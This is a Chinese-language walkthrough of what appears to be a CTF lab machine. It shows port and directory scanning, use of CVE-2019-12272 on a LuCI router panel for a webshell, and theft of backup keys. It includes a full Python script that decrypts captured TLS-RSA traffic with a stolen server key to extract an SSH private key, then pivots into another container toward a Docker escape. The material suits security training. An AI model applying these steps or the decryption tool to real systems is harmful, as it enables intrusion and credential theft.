# 信息收集
```bash

┌──(kali㉿JYlover)-[/mnt/d/github_project/bajitmp]
└─$ nmap -p- 10.20.3.72
Starting Nmap 7.98 ( https://nmap.org ) at 2026-11-03 11:06 +0800
Nmap scan report for bogon (10.20.3.72)
Host is up (0.0017s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  EtherNetIP-1
8080/tcp open  http-proxy
8443/tcp open  https-alt

Nmap done: 1 IP address (1 host up) scanned in 8.33 seconds
```

扫描一下端口，发现8080开着，80端口进去是一个欢迎页面，暂时没有什么信息
```bash
┌──(kali㉿JYlover)-[/mnt/d/github_project/bajitmp]
└─$ curl http://10.20.3.72
Hello, MazeSec!
```

# web渗透
进来8080.

![](file-20261103154542366.png)
提示我们有一个``/var/log/messages``文件，肯定是得登录的
目录扫描一下：
```bash
┌  root@JYlover  bash  38.507s 
└  ~/webtool/Dirsearch  #  dirsearch -u http://10.20.3.72:8080/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12289

Target: http://10.20.3.72:8080/

[15:17:00] Scanning: 
[15:17:08] 403 -   181B - /adminjsp
[15:17:08] 403 -   181B - /admin-ajax.php
[15:17:08] 403 -   181B - /admin-ANTIGO
......
[15:17:12] 403 -   181B - /adminxxx
[15:17:18] 403 -   122B - /export/
[15:17:18] 403 -   122B - /export
[15:17:18] 403 -   122B - /files
[15:17:18] 403 -   122B - /files/
[15:17:20] 200 -    3KB - /index.html

Task Completed

```
中间省略了很多admin开头的文件，没有什么规律。
主要是在后面的`/export`和`/files`目录，他们的响应大小也不同，且403说明文件夹存在只是我们没有权限

这里我也不知道ai怎么猜出来的一个**export/index.txt**和**files/readme.txt**文件，想不通
```bash
┌  root@JYlover  bash  32.9s 
└  ~/webtool/Dirsearch  #  curl http://10.20.3.72:8080/export/index.txt
netflow-analyzer export index
=============================
generated : 2019-05-24 09:32:10 UTC
collector : netflow-cron
outdir    : /var/captures
retention : 7 days

Scheduled rollups are registered here by "netflow-cron --register"
so the reporting host can pull them through the download CGI.
Manual runs write straight into outdir and stay unregistered.

(none)


生成时间：2019-05-24 09:32:10 UTC
收集器：netflow-cron
输出目录：/var/captures
保留期：7 天

定期汇总任务由“netflow-cron --register”注册，报告主机可以通过下载 CGI 拉取这些汇总任务。手动运行的结果直接写入输出目录，并保持未注册状态。

（无注册任务）
```

```bash
┌  root@JYlover  bash  67ms 
└  ~/webtool/Dirsearch  #  curl http://10.20.3.72:8080/files/readme.txt
netflow-analyzer diagnostics dump
=================================
build    : 0.9.4 (2019-05-24)
collector: netflow-cron, 30 min rotation, 7 day retention
archive  : /var/captures
export   : /www/export/index.txt
images   : this directory (sysupgrade image + diagnostic blob)


netflow-analyzer 诊断转储
=================================
构建版本：0.9.4 (2019-05-24)
收集器：netflow-cron，30 分钟轮换，7 天保留
归档：/var/captures
导出：/www/export/index.txt
图片：本目录（系统升级镜像 + 诊断数据块）

```
这里就知道有一个/var/captures文件，

然后我们尝试登录（密码也是ai猜出来的）
由于两个文件都提到了netflow，且构建时间为2019年
```
root/netflow2019       
```
登录后会获得一个cookie，并且跳转到一个js文件重复执行查看网卡流量。
![](file-20261103154905413.png)
![](file-20261103154923731.png)

这里存在一个**CVE-2019-12272**
![](file-20261103155513575.png)
![](file-20261103162751614.png)
有.docker文件，所以我们现在应该是在docker容器中
拿到webshell，但是找了一下都没有找到flag，所以先去看看上面获取到的一些文件
## /var/captures
发现/var/captures下有两个流量包
![](file-20261103155907831.png)
```http
-rw-r--r-- 1 root root 11145411 Nov  3 03:05 mgmt-20190524-0912.pcap
-rw-r--r-- 1 root root 21386309 Nov  3 03:05 mgmt-20190524-0931.pcap
```
## /var/log/messages
/var/log/messages是一份系统日志
```http
HTTP/1.1 200 OK
Date: Tue, 03 Nov 2026 08:00:52 GMT
Server: uhttpd/2018-03-01, LuCI/0.10.0
Content-Type: application/json
Connection: keep-alive
Content-Length: 2418

{"result":{"1~
May 24 08:00:01 OpenWrt syslog.info syslogd started: BusyBox v1.28.4
May 24 08:00:01 OpenWrt user.notice kernel: klogd started: BusyBox v1.28.4 (2019-05-13 22:04:11 UTC)
May 24 08:00:02 OpenWrt user.info kernel: [    0.000000] Linux version 4.14.120 (openwrt@buildhost) (gcc version 7.4.0 (OpenWrt GCC 7.4.0 r7828-ef3b437d7c)) #0 SMP Fri May 17 11:22:33 2019
May 24 08:00:03 OpenWrt daemon.info procd: - init complete -
May 24 08:00:05 OpenWrt daemon.info dnsmasq[814]: started, version 2.80 cachesize 150
May 24 08:00:05 OpenWrt daemon.info dnsmasq[814]: reading /tmp/resolv.conf.auto
May 24 08:00:08 OpenWrt cron.err crond[712]: crond (busybox 1.28.4) started, log level 5
May 24 08:00:12 OpenWrt authpriv.info dropbear[905]: Running in background
May 24 08:00:14 OpenWrt user.notice netflow-cron: collector ready (interval 30m, retention 7d, outdir /var/captures)
May 24 09:02:44 OpenWrt authpriv.info dropbear[1671]: Child connection from 192.168.99.100:51234
May 24 09:02:47 OpenWrt authpriv.info dropbear[1671]: Password auth succeeded for 'root' from 192.168.99.100:51234
May 24 09:11:52 OpenWrt user.notice netflow-cron: manual capture requested by root (tty pts/0)
May 24 09:12:03 OpenWrt user.notice netflow-cron: capture started on br-lan (snaplen 128, filter 'ip')
May 24 09:12:41 OpenWrt user.notice netflow-cron: flush 1096 packets, 11145411 bytes -> /var/captures/mgmt-20190524-0912.pcap
May 24 09:30:52 OpenWrt user.notice netflow-cron: manual capture requested by root (tty pts/0)
May 24 09:31:07 OpenWrt user.notice netflow-cron: capture started on br-lan (snaplen 128, filter 'ip')
May 24 09:31:58 OpenWrt user.notice netflow-cron: flush 2144 packets, 21386309 bytes -> /var/captures/mgmt-20190524-0931.pcap
May 24 09:32:01 OpenWrt user.notice netflow-cron: retention sweep: 0 files removed (oldest kept: 7d)
May 24 09:32:04 OpenWrt daemon.info dnsmasq[814]: DHCPDISCOVER(br-lan) 192.168.99.53 aa:bb:cc:00:11:53
May 24 09:32:06 OpenWrt user.info netflow-analyzer: diagnostics pack rebuilt after config change, staged in /www/files
May 24 09:58:11 OpenWrt user.notice netflow-cron: manual capture requested by root (tty pts/0)
May 24 09:58:19 OpenWrt user.notice netflow-cron: flush 0 packets, 0 bytes -> /var/captures/mgmt-20190524-0958.pcap
May 24 09:58:19 OpenWrt user.err netflow-cron: capture aborted: no traffic on br-lan, file removed
~":{"rx":"301056 B/s","tx":"281600 B/s"}}}

```

之后又在/opt/wrt发现了完整的项目源码

还有启动脚本中有详细的项目信息：
```sh
#!/bin/bash
# WRT 容器入口：netflow-analyzer 调试容器
#   * uhttpd 风格 Web 服务（80/443，LuCI 0.10）
#   * sshd（22，容器内部 —— 流量包里的 SSH 会话是连到这里的）
#   * /var/captures/  真实抓包样本（由 gen/capture_traffic.sh 捕获）
#   * /var/backups/   系统备份（backup-20190524.tar.gz，含 uhttpd 私钥）
set -e

export LUCI_DOCROOT=/www
export LUCI_CGI_DIR=/cgi-bin
export LUCI_BACKUP_DIR=/var/backups
export LUCI_KEYSTORE_DIR=/var/keys
export LUCI_PASSWORD="${LUCI_PASSWORD:-netflow2019}"
export BASH_BIN=/bin/bash

# ---- 目录结构 ----
mkdir -p /www /www/files /www/export /cgi-bin /var/captures /var/backups /var/keys \
         /var/log /root/.ssh /run/sshd

# ---- Web 素材 ----
cp /opt/wrt/www/index.html /www/
[ -d /opt/wrt/www/luci ] && cp -r /opt/wrt/www/luci/* /www/ 2>/dev/null || true
cp /opt/wrt/cgi/*.sh /cgi-bin/
cp /opt/wrt/cgi/luci-bwc /cgi-bin/luci-bwc
cp /opt/wrt/cgi/luci-bwc /usr/bin/luci-bwc
chmod +x /cgi-bin/*.sh /cgi-bin/luci-bwc /usr/bin/luci-bwc

# ---- 备份包就位（/var/backups）----
if [ -d /opt/wrt/backup ]; then
    cp /opt/wrt/backup/* /var/backups/ 2>/dev/null || true
fi

# ---- 抓包样本就位（/var/captures，路径穿越的目标）----
if [ -d /opt/wrt/captures ]; then
    cp /opt/wrt/captures/* /var/captures/ 2>/dev/null || true
    rm -f /var/captures/.keep
fi

# ---- 公开下载目录：制造 TLS 流量用的数据块 ----
dd if=/dev/urandom of=/www/files/big.bin bs=1024 count=4096 status=none
dd if=/dev/urandom of=/www/files/openwrt-15.05-sysupgrade.bin \
   bs=1024 count=512 status=none
cat > /www/files/readme.txt <<'READMEEOF'
netflow-analyzer diagnostics dump
=================================
build    : 0.9.4 (2019-05-24)
collector: netflow-cron, 30 min rotation, 7 day retention
archive  : /var/captures
export   : /www/export/index.txt
images   : this directory (sysupgrade image + diagnostic blob)
READMEEOF

# ---- sshd（router 风格；容器内 22 端口，不对外发布）----
ssh-keygen -A >/dev/null 2>&1 || true
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys /root/.ssh/id_rsa 2>/dev/null || true
/usr/sbin/sshd 2>/dev/null || echo "WARN: sshd 启动失败"

# ---- 素材就位检查 ----
for f in /var/captures/mgmt-20190524-0912.pcap /var/captures/mgmt-20190524-0931.pcap \
         /var/backups/backup-20190524.tar.gz \
         /opt/wrt/tls/server.crt /opt/wrt/tls/server.key; do
    [ -f "$f" ] || echo "WARN: 缺少素材 $f"
done

echo "=================================================="
echo " OpenWrt 18.06.4 (LuCI 0.10.0) - netflow-analyzer"
echo " http://0.0.0.0:80  |  https://0.0.0.0:443  |  sshd :22"
echo " captures: /var/captures   backups: /var/backups"
echo "=================================================="

exec python3 /opt/wrt/server.py"
```
我们知道有/var/backups备份文件，可以用复制到/www/files/下面下载的方式得到
```bash
cp -a /var/backups /www/files 
```
然后打包就可以直接访问下载了。
看一下文件结构：
```bash
┌──(kali㉿JYlover)-[/mnt/d/Downloads/10.20.3.72-loot/backup]
└─$ tree -a
.
├── backup-notes.txt
├── etc
│   ├── config
│   │   ├── network
│   │   ├── system
│   │   └── uhttpd
│   ├── uhttpd.crt
│   └── uhttpd.key
└── root
    └── .ssh
        ├── authorized_keys
        ├── id_rsa
        └── id_rsa.pub

5 directories, 9 files
```
其中有私钥、证书、ssh的私钥公钥，还一份说明书
看一下说明书：
```bash
┌──(kali㉿JYlover)-[/mnt/d/Downloads/10.20.3.72-loot/backup]
└─$ cat backup-notes.txt 
OpenWrt full backup - 2019-05-24 (root@OpenWrt)
==============================================

Contents:
  etc/config/*        system configuration (network, uhttpd, system)
  etc/uhttpd.key      TLS private key of the LuCI web UI (https, port 443)
  etc/uhttpd.crt      self-signed cert CN=openwrt.lan (same key material)
  root/.ssh/id_rsa    this router's own root key

Notes:
  * Management-bridge captures of 2019-05-24 are kept in /var/captures/
    (mgmt-20190524-*.pcap). netflow-analyzer still needs them - do NOT delete.
  * 2019-05-24 09:31 - pushed the Docker host's root key to this box over
    HTTPS (admin -> SSH-Keys) so the host can be managed from the UI.
    That session is inside the 09:31 capture.
  * The uhttpd key predates the 15.05 upgrade - TODO: rotate it.
```
就是：**管理员通过「SSH-Keys」管理页，把宿主机 root 的私钥推到这台设备上了，那次 HTTPS 会话就在 09:31 的流量包里。**
那么应该就是要解密HTTPS的流量包，里面会有明文私钥，这里贴一下可以解密的条件
![](file-20261103233547859.png)
我们用上面的方法拿到两个流量包。ai给写的解密脚本。
```py
"""
TLS 1.2 / TLS_RSA_WITH_AES_128_CBC_SHA 被动解密
- RSA 私钥解 ClientKeyExchange -> premaster secret
- TLS 1.2 PRF(SHA256) -> master secret -> key_block
- 每条记录: explicit IV + AES-128-CBC
依赖: openssl CLI (RSA PKCS#1 v1.5 解密 + AES-CBC)
"""
import hashlib
import hmac
import os
import struct
import subprocess
import sys
import tempfile

KEY = sys.argv[1]
OUTDIR = sys.argv[2]
PCAPS = sys.argv[3:]
os.makedirs(OUTDIR, exist_ok=True)


# ---------------------------------------------------------------- pcap
def load_pcap(path):
    d = open(path, 'rb').read()
    magic = struct.unpack('<I', d[:4])[0]
    end = '<' if magic == 0xa1b2c3d4 else '>'
    snap, link = struct.unpack(end + 'II', d[16:24])
    off, pkts = 24, []
    while off + 16 <= len(d):
        ts, tu, incl, orig = struct.unpack(end + 'IIII', d[off:off + 16])
        off += 16
        pkts.append(d[off:off + incl])
        off += incl
    return pkts


def tcp_streams(pkts):
    """返回 {(src,sp,dst,dp): bytes}，按 seq 重排并去重"""
    segs = {}
    for raw in pkts:
        if len(raw) < 34 or struct.unpack('>H', raw[12:14])[0] != 0x0800:
            continue
        ip = raw[14:]
        if len(ip) < 20 or ip[9] != 6:
            continue
        ihl = (ip[0] & 0xf) * 4
        if len(ip) < ihl + 20:
            continue
        tot = struct.unpack('>H', ip[2:4])[0]
        src = '.'.join(str(b) for b in ip[12:16])
        dst = '.'.join(str(b) for b in ip[16:20])
        sp, dp = struct.unpack('>HH', ip[ihl:ihl + 4])
        seq = struct.unpack('>I', ip[ihl + 4:ihl + 8])[0]
        doff = (ip[ihl + 12] >> 4) * 4
        pay = ip[ihl + doff:tot]
        if not pay:
            continue
        segs.setdefault((src, sp, dst, dp), {})[seq] = pay
    out = {}
    for key, m in segs.items():
        buf, base = b'', None
        for seq in sorted(m):
            if base is None:
                base = seq
            if seq < base + len(buf):
                ov = base + len(buf) - seq
                if ov < len(m[seq]):
                    buf += m[seq][ov:]
                continue
            buf += m[seq]
        out[key] = buf
    return out


# ---------------------------------------------------------------- 加密
def aes_cbc_decrypt(key, iv, data):
    with tempfile.NamedTemporaryFile(delete=False) as f:
        f.write(data)
        tmp = f.name
    try:
        p = subprocess.run(
            ['openssl', 'enc', '-d', '-aes-128-cbc', '-nopad',
             '-K', key.hex(), '-iv', iv.hex(), '-in', tmp],
            capture_output=True)
        return p.stdout
    finally:
        os.unlink(tmp)


def rsa_decrypt(ct):
    with tempfile.NamedTemporaryFile(delete=False) as f:
        f.write(ct)
        tmp = f.name
    try:
        p = subprocess.run(
            ['openssl', 'pkeyutl', '-decrypt', '-inkey', KEY,
             '-pkeyopt', 'rsa_padding_mode:pkcs1', '-in', tmp],
            capture_output=True)
        if p.returncode != 0:
            raise RuntimeError(p.stderr.decode()[:200])
        return p.stdout
    finally:
        os.unlink(tmp)


def prf12(secret, label, seed, n):
    return p_hash(hashlib.sha256, secret, label + seed, n)


def p_hash(h, secret, seed, n):
    out, a = b'', seed
    while len(out) < n:
        a = hmac.new(secret, a, h).digest()
        out += hmac.new(secret, a + seed, h).digest()
    return out[:n]


# ---------------------------------------------------------------- TLS
def parse_records(buf):
    off, recs = 0, []
    while off + 5 <= len(buf):
        ctype, ver, ln = struct.unpack('>BHH', buf[off:off + 5])
        off += 5
        if off + ln > len(buf):
            break
        recs.append((ctype, ver, buf[off:off + ln]))
        off += ln
    return recs


def decrypt_flow(name, c2s, s2c):
    """c2s/s2c: 该方向字节流。返回 (server 明文, client 明文)"""
    hs = b''      # 客户端方向握手消息累积
    srv_rnd = cli_rnd = None
    enc_pms = None
    ccs = False
    c_plain, s_plain = b'', b''

    for ctype, ver, data in parse_records(c2s):
        if ctype == 22:
            hs += data
        elif ctype == 20:
            ccs = True
    if not ccs:
        return None, None, 'no CCS'

    # 解析客户端握手
    off = 0
    while off + 4 <= len(hs):
        mt = hs[off]
        ln = struct.unpack('>I', b'\x00' + hs[off + 1:off + 4])[0]
        body = hs[off + 4:off + 4 + ln]
        off += 4 + ln
        if mt == 1 and len(body) >= 34:            # ClientHello
            cli_rnd = body[2:34]
        elif mt == 16:                              # ClientKeyExchange
            l = struct.unpack('>H', body[:2])[0]
            enc_pms = body[2:2 + l]

    # 解析服务端握手（独立循环，避免和服务端记录混在一起）
    shs = b''
    for ctype, ver, data in parse_records(s2c):
        if ctype == 22:
            shs += data
        elif ctype == 20:
            break
    off = 0
    while off + 4 <= len(shs):
        mt = shs[off]
        ln = struct.unpack('>I', b'\x00' + shs[off + 1:off + 4])[0]
        body = shs[off + 4:off + 4 + ln]
        off += 4 + ln
        if mt == 2 and len(body) >= 34:            # ServerHello
            srv_rnd = body[2:34]

    if not (cli_rnd and srv_rnd and enc_pms):
        return None, None, 'missing hello/pms'

    pms = rsa_decrypt(enc_pms)
    if len(pms) != 48:
        return None, None, 'bad pms len %d' % len(pms)
    master = prf12(pms, b'master secret', cli_rnd + srv_rnd, 48)
    kb = prf12(master, b'key expansion', srv_rnd + cli_rnd, 104)
    c_mac, s_mac = kb[0:20], kb[20:40]
    c_key, s_key = kb[40:56], kb[56:72]

    def strip(pt):
        if not pt:
            return b''
        pad = pt[-1]
        body = pt[:-(pad + 1)] if 0 <= pad < 16 else pt
        return body[:-20] if len(body) > 20 else b''

    seen_c = seen_s = False
    for ctype, ver, data in parse_records(c2s):
        if ctype == 20:
            seen_c = True
            continue
        if seen_c and ctype == 23 and len(data) > 32:
            c_plain += strip(aes_cbc_decrypt(c_key, data[:16], data[16:]))
    for ctype, ver, data in parse_records(s2c):
        if ctype == 20:
            seen_s = True
            continue
        if seen_s and ctype == 23 and len(data) > 32:
            s_plain += strip(aes_cbc_decrypt(s_key, data[:16], data[16:]))
    return s_plain, c_plain, 'ok'


total = 0
for pcap in PCAPS:
    pkts = load_pcap(pcap)
    streams = tcp_streams(pkts)
    flows = {}
    for (s, sp, d, dp), buf in streams.items():
        if dp == 443:
            flows.setdefault((s, sp, d, dp), {})['c2s'] = buf
        elif sp == 443:
            flows.setdefault((d, dp, s, sp), {})['s2c'] = buf
    for (s, sp, d, dp), parts in flows.items():
        if len(parts) != 2:
            continue
        sp_, cp_, st = decrypt_flow('%s:%d' % (s, sp), parts['c2s'], parts['s2c'])
        tag = '%s_%s_%d_to_%d' % (os.path.basename(pcap)[:12], s.replace('.', '-'), sp, dp)
        print('%-40s %s  server=%d client=%d' % (tag, st, len(sp_ or b''), len(cp_ or b'')))
        if st == 'ok':
            open(os.path.join(OUTDIR, tag + '.server.txt'), 'wb').write(sp_)
            open(os.path.join(OUTDIR, tag + '.client.txt'), 'wb').write(cp_)
            total += len(sp_) + len(cp_)
print('total plaintext', total)
```
```bash
┌──(kali㉿JYlover)-[/mnt/c/Users/Public]
└─$ python3 tlsdec.py  /mnt/d/Downloads/10.20.3.72-loot/backup/etc/uhttpd.key /tmp/a  /mnt/d/Downloads/mgmt-20190524-0912.pcap /mnt/d/Downloads/mgmt-20190524-0931.pcap
mgmt-2019052_192-168-99-100_38850_to_443 ok  server=426 client=187
mgmt-2019052_192-168-99-100_38852_to_443 ok  server=4194489 client=234
mgmt-2019052_192-168-99-100_37992_to_443 ok  server=6283742 client=156
mgmt-2019052_192-168-99-100_34544_to_443 ok  server=214 client=317
mgmt-2019052_192-168-99-100_34550_to_443 ok  server=200 client=2324
mgmt-2019052_192-168-99-100_34554_to_443 ok  server=215 client=816
mgmt-2019052_192-168-99-100_34560_to_443 ok  server=200 client=2348
mgmt-2019052_192-168-99-100_33734_to_443 ok  server=1219 client=235
mgmt-2019052_192-168-99-100_33740_to_443 ok  server=4194489 client=234
mgmt-2019052_192-168-99-100_33754_to_443 ok  server=4194489 client=184
mgmt-2019052_192-168-99-100_39540_to_443 bad pms len 42  server=0 client=0
mgmt-2019052_192-168-99-100_39556_to_443 bad pms len 130  server=0 client=0
mgmt-2019052_192-168-99-100_39562_to_443 bad pms len 123  server=0 client=0
mgmt-2019052_192-168-99-100_33756_to_443 ok  server=1039 client=561
total plaintext 18878318
```
![](file-20261103235013590.png)
这就可以正常看请求和响应了，最后有几个解密失败但是不影响。
![](file-20261104000435221.png)
我们拿到了ssh的私钥，我们可以来登录
```bash
──(kali㉿JYlover)-[/tmp/a]
└─$ ssh -i /tmp/a/key_fixed root@172.16.12.149
The authenticity of host '172.16.12.149 (172.16.12.149)' can't be established.
ED25519 key fingerprint is: SHA256:i2UIg7g9fQQwI5bCeo4D8HncjAedsXLeeoATKY9S5bc
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:8: [hashed name]
    ~/.ssh/known_hosts:11: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.16.12.149' (ED25519) to the list of known hosts.
root@172.16.12.149's password: 
```
居然要密码，那说明不是这个密钥，但是注意信息收集时我们扫到了一个22端口，一个2222端口，显然22端口应该是我们现在webshell所处的docker容器的ssh端口，于是我们试试2222
```bash
┌──(kali㉿JYlover)-[/tmp/a]
└─$ ssh  -p 2222 -i /tmp/a/key_fixed root@172.16.12.149
 _______                    _        __
|       |.-----.---.-.----.|__|.----.|  |_
|   -   ||  _  |  _  |   _||  ||  __||   _|
|_______||   __|___._|__|  |__||____||____|
        |__| W I R E L E S S   F R E E D O M
-----------------------------------------------------
OpenWrt 18.06.4, r7828-ef3b437d7c
-----------------------------------------------------
Authorized access only. All connections are logged.
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

OpenWrt:~#
```
登陆成功
# docker逃逸
原本以为这里已经到了宿主机了，但是没想到居然还是在docker容器中
```bash
OpenWrt:~# ls / -a
.              bin            etc            media          proc           sbin           tmp
..             dev            home           mnt            root           srv            usr
.dockerenv     entrypoint.sh  lib            opt            run            sys            var
OpenWrt:~#
```
存在.dockerenv文件
传fscan上去扫了一下，大概看一下内网情况
![](file-20261104002335462.png)
一共有3台机器：
1. 之前webshell的机器：192.168.90.21 
2. 我们这台机器：192.168.90.22
3. 还一台192.168.90.1应该就是宿主机了，我们的目标应该就是逃逸到宿主机获取flag
